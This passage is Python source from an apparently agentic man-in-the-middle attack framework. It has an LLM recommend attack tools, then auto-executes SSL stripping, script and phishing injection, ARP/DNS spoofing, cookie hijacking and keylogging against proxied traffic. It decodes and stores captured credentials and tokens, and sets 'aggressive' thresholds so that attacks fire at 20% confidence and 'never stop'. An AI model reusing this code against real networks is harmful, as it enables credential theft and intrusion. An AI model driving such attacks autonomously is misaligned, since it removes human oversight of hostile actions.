- Host: {context.get('target_host', 'unknown')}:{context.get('target_port', 80)}
- HTTPS: {context.get('has_https', False)}
- Authentication: {context.get('has_auth', False)} (type: {context.get('auth_type', 'none')})
- Cookies: {context.get('has_cookies', False)}
- Forms detected: {context.get('has_forms', False)}
- Requests analyzed: {context.get('traffic_count', 0)}
- Sensitive endpoints: {context.get('sensitive_endpoints', [])[:5]}

SECURITY GAPS:
- Missing headers: {list(context.get('missing_headers', set()))[:8]}
- Cookie flags missing: {list(context.get('cookie_flags_missing', set()))}
- Technologies detected: {list(context.get('technologies', set()))[:5]}
{finding_summary}
ALREADY RECOMMENDED: {existing_tool_ids}

AVAILABLE ATTACK TOOLS:
{json.dumps(available_tools[:12], indent=2)}

TASK: Recommend 0-3 additional attack tools. Prioritize:
1. Tools that chain well with previous findings
2. High-impact exploitation tools based on detected vulnerabilities
3. Tools matching specific triggers in the context

Return a JSON array ONLY: [{{"tool_id": "...", "confidence": 0.X, "reason": "...", "expected_impact": "..."}}]
Return empty array [] if no additional recommendations make sense."""

            response = await client.aio.models.generate_content(
                model="gemini-3-flash-preview",
                contents=prompt,
                config=types.GenerateContentConfig(
                    thinking_config={"thinking_level": "medium"},
                    max_output_tokens=600,
                )
            )
            
            if response and response.text:
                text = response.text.strip()
                if text.startswith("```"):
                    text = text.split("```")[1]
                    if text.startswith("json"):
                        text = text[4:]
                text = text.strip()
                
                ai_recs_raw = json.loads(text)
                ai_recs = []
                
                for rec in ai_recs_raw:
                    tool_id = rec.get("tool_id")
                    if tool_id in self.tools:
                        tool = self.tools[tool_id]
                        ai_recs.append(AIToolRecommendation(
                            tool_id=tool_id,
                            tool_name=tool.name,
                            confidence=min(1.0, max(0.0, float(rec.get("confidence", 0.5)))),
                            reason=rec.get("reason", "AI recommended based on context analysis"),
                            based_on_findings=["AI traffic analysis", "Previous findings"] if previous_findings else ["AI traffic analysis"],
                            expected_impact=rec.get("expected_impact", tool.expected_findings[0] if tool.expected_findings else ""),
                            execution_steps=tool.poc_examples or ["Execute tool"],
                            auto_executable=True
                        ))
                
                return ai_recs
            
        except Exception as e:
            logger.warning(f"AI recommendation failed: {e}")
        
        return []
    
    def _merge_recommendations(
        self,
        pattern_recs: List[AIToolRecommendation],
        ai_recs: List[AIToolRecommendation]
    ) -> List[AIToolRecommendation]:
        """Merge pattern and AI recommendations, avoiding duplicates"""
        seen_tools = set()
        merged = []
        
        for rec in pattern_recs:
            if rec.tool_id not in seen_tools:
                seen_tools.add(rec.tool_id)
                merged.append(rec)
        
        for rec in ai_recs:
            if rec.tool_id not in seen_tools:
                seen_tools.add(rec.tool_id)
                merged.append(rec)
        
        return merged


# Import extended tools after base classes are defined (avoids circular import)
from .mitm_attack_tools_extended import MITM_EXTENDED_TOOLS, get_all_extended_tools


# ============================================================================
# Agentic Tool Executor with Real-Time Monitoring
# ============================================================================

class MITMAgenticExecutor:
    """
    Truly Agentic MITM executor with:
    - Real-time traffic monitoring and event callbacks
    - Attack verification loops (did the attack work?)
    - Goal-oriented planning (compromise auth, exfiltrate data, etc.)
    - Autonomous decision making with confidence thresholds
    - External tool integration (actual sslstrip, bettercap commands)
    - Memory of past attacks and their effectiveness
    """
    
    def __init__(self, mitm_service):
        self.mitm_service = mitm_service

        # Merge base tools with extended tools
        self.tools = {**MITM_ATTACK_TOOLS, **MITM_EXTENDED_TOOLS}

        self.recommendation_engine = MITMToolRecommendationEngine()
        self.execution_log: List[Dict] = []
        self.last_decision_logs: Dict[str, List[Dict]] = {}

        # Store findings per proxy for later inclusion in exports
        self.proxy_findings: Dict[str, List[Dict]] = {}
        self.proxy_captured_data: Dict[str, Dict] = {}

        # Agentic state
        self.active_monitors: Dict[str, asyncio.Task] = {}  # Real-time traffic monitors
        self.active_sessions: Dict[str, asyncio.Task] = {}  # Active agentic sessions
        self.session_cancel_flags: Dict[str, bool] = {}  # Cancellation flags for sessions
        self.attack_goals: Dict[str, List[Dict]] = {}  # Goals per proxy
        self.attack_memory: List[Dict] = []  # Memory of past attacks for learning
        self.event_callbacks: Dict[str, List[Callable]] = {}  # Event subscribers
        self.verification_results: Dict[str, Dict] = {}  # Attack success verification

        # =================================================================
        # NEW: Enhanced Agentic Components
        # =================================================================

        # Memory system with Bayesian learning
        self.memory = MITMAgentMemory(max_memories=1000)

        # Chain-of-thought reasoning engine
        self.reasoner = MITMChainOfThoughtReasoner(self.memory)

        # Exploration/exploitation manager (Thompson sampling)
        self.explorer = MITMExplorationManager(self.memory)

        # Phase controller (goal-oriented attack phases)
        self.phase_controller = MITMPhaseController(self.memory)

        # Attack chain executor (automatic chaining)
        self.chain_executor = MITMChainExecutor(tool_executor=self, memory=self.memory)

        # MITRE ATT&CK narrative generator
        self.narrative_generator = MITMNarrativeGenerator()

        # External tool integration (Bettercap, Responder, mitmproxy)
        self.external_tools = ExternalToolManager()

        # =================================================================
        # AGGRESSIVE: Lowered thresholds for autonomous action
        # =================================================================
        self.auto_execute_threshold = 0.2  # Auto-execute if confidence > 20% (lowered from 70%)
        self.escalation_threshold = 0.5  # Escalate to more aggressive tools if > 50%
        self.stop_threshold = 0.0  # Never stop due to low confidence (was 0.3)
        self.max_tools_per_session = 15  # Increased from 10

        # Register event handlers for automatic chain triggering
        self._register_chain_event_handlers()
    
    # =========================================================================
    # Event System for Real-Time Monitoring
    # =========================================================================

    def _register_chain_event_handlers(self):
        """Register event handlers for automatic attack chain triggering."""
        # Credential captured -> trigger credential chains
        self.subscribe_to_events("credential_captured", self._on_credential_captured)
        self.subscribe_to_events("token_captured", self._on_token_captured)
        self.subscribe_to_events("attack_verified", self._on_attack_verified)

    def _on_credential_captured(self, data: Dict):
        """Handle credential capture event - may trigger chains."""
        proxy_id = data.get("proxy_id")
        if proxy_id:
            self.chain_executor.emit_event("credentials_captured", data)
            # Update phase metrics
            if self.phase_controller.current_state:
                self.phase_controller.current_state.credentials_captured += 1

    def _on_token_captured(self, data: Dict):
        """Handle token capture event."""
        token_type = data.get("type", "unknown")
        if token_type == "bearer" or "jwt" in token_type.lower():
            self.chain_executor.emit_event("jwt_token_captured", data)
        self.chain_executor.emit_event("api_token_captured", data)

    def _on_attack_verified(self, data: Dict):
        """Handle attack verification event."""
        tool_id = data.get("tool_id", "")
        success = data.get("success", False)

        if success:
            # Map tool success to chain triggers
            if tool_id == "sslstrip":
                self.chain_executor.emit_event("ssl_strip_successful", data)
            elif tool_id == "script_injector":
                self.chain_executor.emit_event("script_injection_successful", data)
            elif tool_id in ["arp_spoofing", "dns_spoofing"]:
                self.chain_executor.emit_event("network_access_confirmed", data)

    def subscribe_to_events(self, event_type: str, callback: Callable):
        """Subscribe to agent events (traffic_captured, credential_found, attack_success, etc.)"""
        if event_type not in self.event_callbacks:
            self.event_callbacks[event_type] = []
        self.event_callbacks[event_type].append(callback)

    def _emit_event(self, event_type: str, data: Dict):
        """Emit an event to all subscribers AND broadcast via WebSocket for real-time UI updates"""
        # Call local callbacks
        for callback in self.event_callbacks.get(event_type, []):
            try:
                if asyncio.iscoroutinefunction(callback):
                    asyncio.create_task(callback(data))
                else:
                    callback(data)
            except Exception as e:
                logger.warning(f"Event callback error: {e}")

        # Broadcast via WebSocket for real-time frontend updates
        proxy_id = data.get("proxy_id")
        if proxy_id:
            ws_message = {
                "type": "agent_event",
                "event": event_type,
                "data": data,
                "timestamp": datetime.now().isoformat()
            }
            try:
                mitm_stream_manager.emit(proxy_id, ws_message)
                logger.debug(f"WebSocket broadcast: {event_type} for proxy {proxy_id}")
            except Exception as e:
                logger.debug(f"WebSocket broadcast failed: {e}")
    
    # =========================================================================
    # Goal-Oriented Planning
    # =========================================================================
    
    def set_attack_goals(self, proxy_id: str, goals: List[str]):
        """Set high-level attack goals for autonomous operation"""
        goal_definitions = {
            "compromise_authentication": {
                "name": "Compromise Authentication",
                "description": "Capture or bypass authentication mechanisms",
                "success_indicators": ["credentials_captured", "session_hijacked", "token_stolen"],
                "relevant_tools": ["credential_sniffer", "cookie_hijacker", "sslstrip", "phishing_injector"],
                "priority": 1
            },
            "exfiltrate_data": {
                "name": "Exfiltrate Sensitive Data",
                "description": "Capture sensitive data from traffic",
                "success_indicators": ["pii_captured", "api_keys_found", "secrets_exposed"],
                "relevant_tools": ["credential_sniffer", "header_analyzer", "tech_fingerprint"],
                "priority": 2
            },
            "inject_payload": {
                "name": "Inject Malicious Payload",
                "description": "Successfully inject scripts or content",
                "success_indicators": ["script_executed", "content_modified", "form_hijacked"],
                "relevant_tools": ["script_injector", "csp_bypass", "phishing_injector"],
                "priority": 3
            },
            "downgrade_security": {
                "name": "Downgrade Security Controls",
                "description": "Remove or bypass security mechanisms",
                "success_indicators": ["https_stripped", "headers_removed", "csp_bypassed"],
                "relevant_tools": ["sslstrip", "hsts_bypass", "csp_bypass", "cors_manipulator"],
                "priority": 2
            },
            "map_attack_surface": {
                "name": "Map Attack Surface",
                "description": "Discover vulnerabilities and attack vectors",
                "success_indicators": ["technologies_identified", "endpoints_mapped", "vulnerabilities_found"],
                "relevant_tools": ["header_analyzer", "tech_fingerprint"],
                "priority": 4
            }
        }
        
        self.attack_goals[proxy_id] = [
            goal_definitions.get(g, {"name": g, "priority": 5})
            for g in goals if g in goal_definitions
        ]
        
        self._emit_event("goals_set", {
            "proxy_id": proxy_id,
            "goals": self.attack_goals[proxy_id]
        })
    
    def get_goal_progress(self, proxy_id: str) -> Dict:
        """Get progress towards attack goals"""
        goals = self.attack_goals.get(proxy_id, [])
        findings = self.proxy_findings.get(proxy_id, [])
        captured = self.proxy_captured_data.get(proxy_id, {})
        
        progress = []
        for goal in goals:
            indicators_met = []
            for indicator in goal.get("success_indicators", []):
                if indicator == "credentials_captured" and captured.get("credentials"):
                    indicators_met.append(indicator)
                elif indicator == "session_hijacked" and captured.get("cookies"):
                    indicators_met.append(indicator)
                elif indicator == "token_stolen" and captured.get("tokens"):
                    indicators_met.append(indicator)
                elif any(indicator in f.get("category", "").lower() for f in findings):
                    indicators_met.append(indicator)
            
            progress.append({
                "goal": goal.get("name"),
                "indicators_total": len(goal.get("success_indicators", [])),
                "indicators_met": len(indicators_met),
                "completion": len(indicators_met) / max(1, len(goal.get("success_indicators", []))) * 100,
                "details": indicators_met
            })
        
        return {"proxy_id": proxy_id, "goals": progress}
    
    # =========================================================================
    # Real-Time Traffic Monitoring
    # =========================================================================
    
    async def start_traffic_monitor(self, proxy_id: str, monitor_config: Dict = None):
        """Start real-time traffic monitoring with automatic analysis"""
        if proxy_id in self.active_monitors:
            return {"status": "already_monitoring", "proxy_id": proxy_id}
        
        config = monitor_config or {
            "auto_analyze": True,
            "capture_credentials": True,
            "detect_vulnerabilities": True,
            "trigger_attacks": True,  # Automatically trigger attacks when opportunities found
            "interval_seconds": 2
        }
        
        async def monitor_loop():
            last_traffic_count = 0
            while proxy_id in self.active_monitors:
                try:
                    proxy = self.mitm_service._get_proxy(proxy_id)
                    current_count = len(proxy.traffic_log)
                    
                    if current_count > last_traffic_count:
                        # New traffic captured
                        new_entries = proxy.traffic_log[last_traffic_count:current_count]
                        last_traffic_count = current_count
                        
                        # Analyze new traffic
                        analysis = await self._analyze_new_traffic(proxy_id, new_entries, config)
                        
                        if analysis.get("findings"):
                            self._emit_event("traffic_analyzed", {
                                "proxy_id": proxy_id,
                                "new_entries": len(new_entries),
                                "findings": analysis["findings"]
                            })
                        
                        # Auto-trigger attacks if enabled
                        if config.get("trigger_attacks") and analysis.get("attack_opportunities"):
                            for opportunity in analysis["attack_opportunities"]:
                                if opportunity["confidence"] >= self.auto_execute_threshold:
                                    logger.info(f"Auto-triggering attack: {opportunity['tool_id']}")
                                    await self.execute_tool(opportunity["tool_id"], proxy_id)
                                    self._emit_event("attack_triggered", {
                                        "proxy_id": proxy_id,
                                        "tool_id": opportunity["tool_id"],
                                        "reason": opportunity["reason"]
                                    })
                    
                    await asyncio.sleep(config.get("interval_seconds", 2))
                    
                except Exception as e:
                    logger.error(f"Monitor error: {e}")
                    await asyncio.sleep(5)
        
        self.active_monitors[proxy_id] = asyncio.create_task(monitor_loop())
        return {"status": "monitoring_started", "proxy_id": proxy_id, "config": config}
    
    async def stop_traffic_monitor(self, proxy_id: str):
        """Stop traffic monitoring for a proxy"""
        if proxy_id in self.active_monitors:
            self.active_monitors[proxy_id].cancel()
            del self.active_monitors[proxy_id]
            return {"status": "stopped", "proxy_id": proxy_id}
        return {"status": "not_monitoring", "proxy_id": proxy_id}

    async def stop_agentic_session(self, proxy_id: str) -> Dict[str, Any]:
        """
        Stop an active agentic attack session for a proxy.

        This sets a cancellation flag that the session loop checks,
        and also cancels any active monitors.
        """
        results = {
            "proxy_id": proxy_id,
            "session_stopped": False,
            "monitor_stopped": False,
            "message": ""
        }

        # Set cancellation flag for the session loop
        if proxy_id in self.session_cancel_flags:
            self.session_cancel_flags[proxy_id] = True
            results["session_stopped"] = True
            results["message"] = "Agentic session stop requested"
            logger.info(f"Stop requested for agentic session on proxy {proxy_id}")

        # Cancel active session task if exists
        if proxy_id in self.active_sessions:
            try:
                self.active_sessions[proxy_id].cancel()
                del self.active_sessions[proxy_id]
                results["session_stopped"] = True
            except Exception as e:
                logger.warning(f"Error cancelling session task: {e}")

        # Also stop the traffic monitor
        if proxy_id in self.active_monitors:
            try:
                self.active_monitors[proxy_id].cancel()
                del self.active_monitors[proxy_id]
                results["monitor_stopped"] = True
            except Exception as e:
                logger.warning(f"Error stopping monitor: {e}")

        # Emit stop event
        self._emit_event("agentic_session_stopped", {
            "proxy_id": proxy_id,
            "timestamp": datetime.utcnow().isoformat()
        })

        if not results["session_stopped"] and not results["monitor_stopped"]:
            results["message"] = "No active session or monitor found"
        else:
            results["message"] = "Session and monitor stopped successfully"

        return results

    async def stop_all_for_proxy(self, proxy_id: str) -> Dict[str, Any]:
        """Stop all agentic activity for a proxy (session + monitor)"""
        return await self.stop_agentic_session(proxy_id)
    
    async def _analyze_new_traffic(self, proxy_id: str, entries: List, config: Dict) -> Dict:
        """Analyze new traffic entries for vulnerabilities and attack opportunities"""
        findings = []
        attack_opportunities = []
        credentials = []
        
        for entry in entries:
            if entry is None:
                continue
            req = entry.request if hasattr(entry, 'request') else {}
            resp = entry.response if hasattr(entry, 'response') else {}
            if req is None:
                req = {}
            if resp is None:
                resp = {}

            req_headers = getattr(req, 'headers', {}) if hasattr(req, 'headers') else (req.get('headers', {}) if isinstance(req, dict) else {})
            resp_headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else (resp.get('headers', {}) if isinstance(resp, dict) else {})
            
            # Real-time credential detection
            if config.get("capture_credentials"):
                auth = req_headers.get('Authorization', '')
                if auth.startswith('Basic '):
                    try:
                        import base64
                        import binascii
                        decoded = base64.b64decode(auth[6:]).decode()
                        if ':' in decoded:
                            user, passwd = decoded.split(':', 1)
                            cred = {
                                "type": "basic_auth",
                                "username": user,
                                "password": passwd,
                                "timestamp": datetime.utcnow().isoformat()
                            }
                            credentials.append(cred)
                            findings.append({
                                "severity": "critical",
                                "category": "credential_exposure",
                                "title": f"Real-Time: Basic Auth Captured",
                                "description": f"Captured credentials for user: {user}",
                                "timestamp": datetime.utcnow().isoformat()
                            })
                            self._emit_event("credential_captured", {
                                "proxy_id": proxy_id,
                                "credential": cred
                            })
                    except (binascii.Error, UnicodeDecodeError, ValueError):
                        pass  # Invalid base64 or encoding
                
                if auth.startswith('Bearer '):
                    token = auth[7:]
                    credentials.append({
                        "type": "bearer_token",
                        "token": token[:50] + "...",
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    self._emit_event("token_captured", {"proxy_id": proxy_id, "type": "bearer"})
            
            # Real-time vulnerability detection
            if config.get("detect_vulnerabilities"):
                # Missing security headers = injection opportunity
                if 'Content-Security-Policy' not in resp_headers:
                    attack_opportunities.append({
                        "tool_id": "script_injector",
                        "confidence": 0.85,
                        "reason": "Missing CSP allows script injection"
                    })
                
                if 'Strict-Transport-Security' not in resp_headers:
                    attack_opportunities.append({
                        "tool_id": "sslstrip",
                        "confidence": 0.8,
                        "reason": "Missing HSTS enables SSL stripping"
                    })
                
                # Cookies without secure flags
                set_cookie = resp_headers.get('Set-Cookie', '')
                if set_cookie and 'httponly' not in set_cookie.lower():
                    attack_opportunities.append({
                        "tool_id": "cookie_hijacker",
                        "confidence": 0.9,
                        "reason": "Cookie without HttpOnly flag - XSS can steal it"
                    })
        
        # Store captured credentials
        if credentials:
            self._store_findings(proxy_id, findings, {"credentials": credentials})
        
        # Dedupe attack opportunities
        seen = set()
        unique_opportunities = []
        for opp in attack_opportunities:
            if opp["tool_id"] not in seen:
                seen.add(opp["tool_id"])
                unique_opportunities.append(opp)
        
        return {
            "findings": findings,
            "attack_opportunities": unique_opportunities,
            "credentials_captured": len(credentials)
        }
    
    # =========================================================================
    # Attack Verification
    # =========================================================================
    
    async def verify_attack_success(self, proxy_id: str, tool_id: str, timeout: int = 30) -> Dict:
        """Verify if an attack was successful by monitoring traffic changes"""
        start_time = time.time()
        proxy = self.mitm_service._get_proxy(proxy_id)
        initial_traffic_count = len(proxy.traffic_log)
        
        verification = {
            "tool_id": tool_id,
            "status": "verifying",
            "indicators": [],
            "success": False
        }
        
        tool = self.tools.get(tool_id)
        if not tool:
            verification["status"] = "unknown_tool"
            return verification
        
        # Wait for traffic and check for success indicators
        while time.time() - start_time < timeout:
            await asyncio.sleep(2)
            
            current_count = len(proxy.traffic_log)
            if current_count > initial_traffic_count:
                new_entries = proxy.traffic_log[initial_traffic_count:]
                
                # Check for success indicators based on tool
                if tool_id == "sslstrip":
                    # Check if any HTTP (not HTTPS) traffic was captured
                    for entry in new_entries:
                        req = entry.request if hasattr(entry, 'request') else {}
                        if hasattr(req, 'path') and not proxy.tls_enabled:
                            verification["indicators"].append("http_traffic_captured")
                            verification["success"] = True
                
                elif tool_id == "credential_sniffer":
                    # Check if credentials were captured
                    captured = self.proxy_captured_data.get(proxy_id, {})
                    if captured.get("credentials"):
                        verification["indicators"].append("credentials_captured")
                        verification["success"] = True
                
                elif tool_id == "script_injector":
                    # Check for evidence of script execution (callback, beacon, etc.)
                    for entry in new_entries:
                        req = entry.request if hasattr(entry, 'request') else {}
                        path = getattr(req, 'path', '') if hasattr(req, 'path') else req.get('path', '')
                        if 'callback' in path or 'beacon' in path or 'exfil' in path:
                            verification["indicators"].append("script_callback_received")
                            verification["success"] = True

                elif tool_id == "cookie_hijacker":
                    # Check if cookies without security flags were captured
                    for entry in new_entries:
                        resp = entry.response if hasattr(entry, 'response') else {}
                        resp_headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else resp.get('headers', {})
                        set_cookie = resp_headers.get('Set-Cookie', '') or resp_headers.get('set-cookie', '')
                        if set_cookie:
                            if 'httponly' not in set_cookie.lower() or 'secure' not in set_cookie.lower():
                                verification["indicators"].append("vulnerable_cookie_captured")
                                verification["success"] = True

                elif tool_id == "csp_bypass":
                    # Check if CSP header was removed from responses
                    for entry in new_entries:
                        resp = entry.response if hasattr(entry, 'response') else {}
                        resp_headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else resp.get('headers', {})
                        header_names = [k.lower() for k in resp_headers.keys()]
                        if 'content-security-policy' not in header_names:
                            verification["indicators"].append("csp_header_absent")
                            verification["success"] = True

                elif tool_id == "cors_manipulator":
                    # Check if CORS headers were modified
                    for entry in new_entries:
                        resp = entry.response if hasattr(entry, 'response') else {}
                        resp_headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else resp.get('headers', {})
                        acao = resp_headers.get('Access-Control-Allow-Origin', '')
                        if acao == '*' or 'true' in resp_headers.get('Access-Control-Allow-Credentials', '').lower():
                            verification["indicators"].append("cors_opened")
                            verification["success"] = True

                elif tool_id == "x_frame_bypass":
                    # Check if X-Frame-Options was removed
                    for entry in new_entries:
                        resp = entry.response if hasattr(entry, 'response') else {}
                        resp_headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else resp.get('headers', {})
                        header_names = [k.lower() for k in resp_headers.keys()]
                        if 'x-frame-options' not in header_names:
                            verification["indicators"].append("clickjacking_enabled")
                            verification["success"] = True

                elif tool_id == "hsts_bypass":
                    # Check if HSTS header was removed
                    for entry in new_entries:
                        resp = entry.response if hasattr(entry, 'response') else {}
                        resp_headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else resp.get('headers', {})
                        header_names = [k.lower() for k in resp_headers.keys()]
                        if 'strict-transport-security' not in header_names:
                            verification["indicators"].append("hsts_stripped")
                            verification["success"] = True

                elif tool_id == "phishing_injector":
                    # Check if phishing form was injected (look for MITM markers in response)
                    for entry in new_entries:
                        resp = entry.response if hasattr(entry, 'response') else {}
                        body = getattr(resp, 'body', '') if hasattr(resp, 'body') else resp.get('body', '')
                        if body and ('mitm-phish' in body.lower() or 'mitm-creds' in body.lower()):
                            verification["indicators"].append("phishing_form_injected")
                            verification["success"] = True

                elif tool_id == "header_analyzer" or tool_id == "tech_fingerprint":
                    # Reconnaissance tools always succeed if we got new traffic
                    verification["indicators"].append("traffic_analyzed")
                    verification["success"] = True

                if verification["success"]:
                    break
        
        verification["status"] = "verified" if verification["success"] else "unverified"
        verification["verification_time_seconds"] = time.time() - start_time
        
        # Store verification result
        self.verification_results[f"{proxy_id}:{tool_id}"] = verification
        
        # Emit event
        self._emit_event("attack_verified", verification)
        
        # Learn from result
        self._record_attack_memory(proxy_id, tool_id, verification["success"])
        
        return verification
    
    def _record_attack_memory(self, proxy_id: str, tool_id: str, success: bool):
        """Record attack outcome for learning"""
        proxy = self.mitm_service._get_proxy(proxy_id)
        
        self.attack_memory.append({
            "timestamp": datetime.utcnow().isoformat(),
            "tool_id": tool_id,
            "target_host": proxy.target_host,
            "target_port": proxy.target_port,
            "tls_enabled": proxy.tls_enabled,
            "success": success,
            "context": {
                "traffic_count": len(proxy.traffic_log),
                "rules_active": len(proxy.rules) if hasattr(proxy, 'rules') else 0
            }
        })
        
        # Keep only recent memories
        if len(self.attack_memory) > 100:
            self.attack_memory = self.attack_memory[-100:]
    
    def get_attack_success_rate(self, tool_id: str = None) -> Dict:
        """Get success rate from attack memory"""
        if tool_id:
            relevant = [m for m in self.attack_memory if m["tool_id"] == tool_id]
        else:
            relevant = self.attack_memory
        
        if not relevant:
            return {"total": 0, "success_rate": 0}
        
        successes = sum(1 for m in relevant if m["success"])
        return {
            "total": len(relevant),
            "successes": successes,
            "success_rate": successes / len(relevant) * 100
        }

    def get_decision_log(self, proxy_id: str) -> List[Dict]:
        """Get last decision log for a proxy"""
        return self.last_decision_logs.get(proxy_id, [])
    
    # =========================================================================
    # Core Execution Methods
    # =========================================================================
    
    def get_proxy_findings(self, proxy_id: str) -> List[Dict]:
        """Get all attack tool findings for a proxy"""
        return self.proxy_findings.get(proxy_id, [])
    
    def get_proxy_captured_data(self, proxy_id: str) -> Dict:
        """Get all captured data for a proxy"""
        return self.proxy_captured_data.get(proxy_id, {})
    
    def clear_proxy_findings(self, proxy_id: str):
        """Clear findings for a proxy"""
        self.proxy_findings.pop(proxy_id, None)
        self.proxy_captured_data.pop(proxy_id, None)
    
    def _store_findings(self, proxy_id: str, findings: List[Dict], captured_data: Dict = None):
        """Store findings and captured data for a proxy"""
        if proxy_id not in self.proxy_findings:
            self.proxy_findings[proxy_id] = []
        self.proxy_findings[proxy_id].extend(findings)
        
        if captured_data:
            if proxy_id not in self.proxy_captured_data:
                self.proxy_captured_data[proxy_id] = {
                    "credentials": [],
                    "tokens": [],
                    "cookies": [],
                    "sensitive_data": []
                }
            for key in ["credentials", "tokens", "cookies", "sensitive_data"]:
                if key in captured_data:
                    self.proxy_captured_data[proxy_id][key].extend(captured_data.get(key, []))
    
    async def execute_tool(
        self,
        tool_id: str,
        proxy_id: str,
        options: Optional[Dict] = None
    ) -> ToolExecutionResult:
        """Execute a single attack tool and return results with findings"""
        start_time = time.time()
        
        if tool_id not in self.tools:
            return ToolExecutionResult(
                tool_id=tool_id,
                success=False,
                execution_time_ms=0,
                errors=[f"Unknown tool: {tool_id}"]
            )
        
        tool = self.tools[tool_id]
        result = ToolExecutionResult(
            tool_id=tool_id,
            success=False,
            execution_time_ms=0
        )
        
        try:
            # Check prerequisites
            proxy = self.mitm_service._get_proxy(proxy_id)
            if not proxy.running:
                result.errors.append("Proxy not running")
                return result
            
            # Execute based on tool type
            if tool.execution_type == "builtin" and tool.rule_template:
                # Apply rule to proxy
                rule_result = self.mitm_service.add_rule(proxy_id, tool.rule_template)
                result.success = True
                result.findings.append({
                    "severity": "info",
                    "category": "tool_execution",
                    "title": f"Attack Tool Activated: {tool.name}",
                    "description": f"The {tool.name} attack tool has been activated via rule '{rule_result.get('name', tool.name)}'",
                    "evidence": f"Rule ID: {rule_result.get('id')}",
                    "tool_id": tool_id,
                    "recommendation": f"Monitor traffic for {', '.join(tool.expected_findings)}"
                })
            
            elif tool.execution_type == "builtin":
                # Execute built-in analysis - route to specific implementations
                # === Passive Analysis Tools (LOW risk) ===
                if tool_id == "credential_sniffer":
                    result = await self._execute_credential_sniffer(proxy_id, proxy, result)
                elif tool_id == "header_analyzer":
                    result = await self._execute_header_analyzer(proxy_id, proxy, result)
                elif tool_id == "tech_fingerprint":
                    result = await self._execute_tech_fingerprint(proxy_id, proxy, result)
                elif tool_id == "traffic_analyzer":
                    result = await self._execute_traffic_analyzer(proxy_id, proxy, result)
                elif tool_id == "cookie_analyzer":
                    result = await self._execute_cookie_analyzer(proxy_id, proxy, result)
                elif tool_id == "auth_flow_analyzer":
                    result = await self._execute_auth_flow_analyzer(proxy_id, proxy, result)
                elif tool_id == "sensitive_data_scanner":
                    result = await self._execute_sensitive_data_scanner(proxy_id, proxy, result)
                # === Active Attack Tools (MEDIUM+ risk) ===
                elif tool_id == "sslstrip":
                    result = await self._execute_sslstrip(proxy_id, proxy, result, tool)
                elif tool_id == "hsts_bypass":
                    result = await self._execute_hsts_bypass(proxy_id, proxy, result, tool)
                elif tool_id == "cookie_hijacker":
                    result = await self._execute_cookie_hijacker(proxy_id, proxy, result, tool)
                elif tool_id == "csp_bypass":
                    result = await self._execute_csp_bypass(proxy_id, proxy, result, tool)
                elif tool_id == "cors_manipulator":
                    result = await self._execute_cors_manipulator(proxy_id, proxy, result, tool)
                elif tool_id == "x_frame_bypass":
                    result = await self._execute_x_frame_bypass(proxy_id, proxy, result, tool)
                elif tool_id == "script_injector":
                    result = await self._execute_script_injector(proxy_id, proxy, result, tool)
                elif tool_id == "phishing_injector":
                    result = await self._execute_phishing_injector(proxy_id, proxy, result, tool)
                elif tool_id == "response_smuggling":
                    result = await self._execute_response_smuggling(proxy_id, proxy, result, tool)
                elif tool_id == "slow_loris":
                    result = await self._execute_slow_loris(proxy_id, proxy, result, tool)
                elif tool_id == "form_hijacker":
                    result = await self._execute_form_hijacker(proxy_id, proxy, result)
                elif tool_id == "jwt_manipulator":
                    result = await self._execute_jwt_manipulator(proxy_id, proxy, result)
                elif tool_id == "websocket_hijacker":
                    result = await self._execute_websocket_hijacker(proxy_id, proxy, result)
                elif tool_id == "api_param_tamperer":
                    result = await self._execute_api_param_tamperer(proxy_id, proxy, result)
                elif tool_id == "cache_poisoner":
                    result = await self._execute_cache_poisoner(proxy_id, proxy, result, tool)
                elif tool_id == "graphql_injector":
                    result = await self._execute_graphql_injector(proxy_id, proxy, result)
                else:
                    # Fallback for any remaining builtin tools - apply rule template if available
                    if tool.rule_template:
                        rule_result = self.mitm_service.add_rule(proxy_id, tool.rule_template)
                        result.success = True
                        result.findings.append({
                            "severity": "info",
                            "category": "tool_execution",
                            "title": f"Attack Rule Applied: {tool.name}",
                            "description": f"Applied rule '{rule_result.get('name', tool.name)}' to proxy",
                            "evidence": f"Rule ID: {rule_result.get('rule_id')}",
                            "tool_id": tool_id
                        })
                    else:
                        result.success = True
                        result.findings.append({
                            "severity": "info",
                            "category": "tool_execution",
                            "title": f"Tool Executed: {tool.name}",
                            "description": tool.description
                        })

            elif tool.execution_type == "external":
                # Execute external tools (network-level attacks)
                if tool_id == "arp_spoofing":
                    result = await self._execute_arp_spoofing(proxy_id, proxy, result, tool)
                elif tool_id == "dns_spoofing":
                    result = await self._execute_dns_spoofing(proxy_id, proxy, result, tool)
                elif tool_id == "dhcp_starvation":
                    result = await self._execute_dhcp_attack(proxy_id, proxy, result, tool, "starvation")
                elif tool_id == "dhcp_rogue":
                    result = await self._execute_dhcp_attack(proxy_id, proxy, result, tool, "rogue")
                elif tool_id == "icmp_redirect":
                    result = await self._execute_icmp_redirect(proxy_id, proxy, result, tool)
                elif tool_id == "llmnr_poison":
                    result = await self._execute_llmnr_poison(proxy_id, proxy, result, tool)
                elif tool_id == "mfa_interceptor":
                    result = await self._execute_mfa_interceptor(proxy_id, proxy, result, tool)
                elif tool_id == "oauth_interceptor":
                    result = await self._execute_oauth_interceptor(proxy_id, proxy, result)
                elif tool_id == "advanced_keylogger":
                    result = await self._execute_advanced_keylogger(proxy_id, proxy, result, tool)
                else:
                    # Generic external tool handling - generate command and provide guidance
                    result = await self._execute_generic_external_tool(proxy_id, proxy, result, tool)
            
            # Log execution
            self.execution_log.append({
                "timestamp": datetime.utcnow().isoformat(),
                "tool_id": tool_id,
                "tool_name": tool.name,
                "proxy_id": proxy_id,
                "success": result.success,
                "findings_count": len(result.findings),
                "execution_time": result.execution_time_ms
            })
            
            # Store findings for later inclusion in exports
            if result.findings:
                self._store_findings(
                    proxy_id, 
                    result.findings,
                    {
                        "credentials": result.credentials_found or [],
                        "tokens": [],
                        "cookies": [],
                        "sensitive_data": []
                    }
                )
            
        except Exception as e:
            result.errors.append(str(e))
            logger.error(f"Tool execution error: {e}")
        
        result.execution_time_ms = (time.time() - start_time) * 1000
        return result
    
    async def _execute_credential_sniffer(
        self,
        proxy_id: str,
        proxy,
